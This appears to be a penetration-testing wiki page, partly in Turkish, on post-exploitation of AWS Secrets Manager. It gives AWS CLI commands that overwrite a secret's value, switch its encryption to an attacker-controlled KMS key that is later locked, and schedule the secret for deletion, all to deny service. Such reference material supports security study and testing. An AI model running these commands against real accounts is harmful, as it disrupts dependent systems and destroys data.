# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

Daha fazla bilgi için bakınız:

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Read Secrets

The **secrets themself are sensitive information**, [check the privesc page](../aws-privilege-escalation/aws-secrets-manager-privesc.md) onları nasıl okuyacağınızı öğrenmek için.

### DoS Change Secret Value

secret'in değerini değiştirerek, **bu değere bağımlı tüm sistemleri DoS edebilirsiniz.**

> [!WARNING]
> Önceki değerlerin de saklandığını unutmayın; bu yüzden önceki değere geri dönmek kolaydır.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Eğer saldırganın secretsmanager:UpdateSecret izni varsa, secret'i saldırgana ait bir KMS key kullanacak şekilde yapılandırabilir. Bu anahtar başlangıçta herkesin erişip kullanabileceği şekilde ayarlanmıştır; bu nedenle secret'i yeni anahtar ile güncellemek mümkündür. Anahtar erişilebilir olmasaydı, secret güncellenemezdi.

Secret için anahtar değiştirildikten sonra, saldırgan kendi anahtarının yapılandırmasını yalnızca kendisinin erişebileceği şekilde değiştirir. Böylece secret'in sonraki sürümleri yeni anahtar ile şifrelenir ve anahtara erişim olmadığından secret'i elde etme yeteneği kaybolur.

Şunu belirtmek önemlidir ki bu erişilemezlik, secret içeriği değiştikten sonra oluşan sonraki sürümlerde meydana gelecektir; çünkü mevcut sürüm hâlen orijinal KMS key ile şifrelenmiştir.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Secret Silme

Bir secret'i silmek için gereken minimum gün sayısı 7'dir
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
{{#include ../../../banners/hacktricks-training.md}}
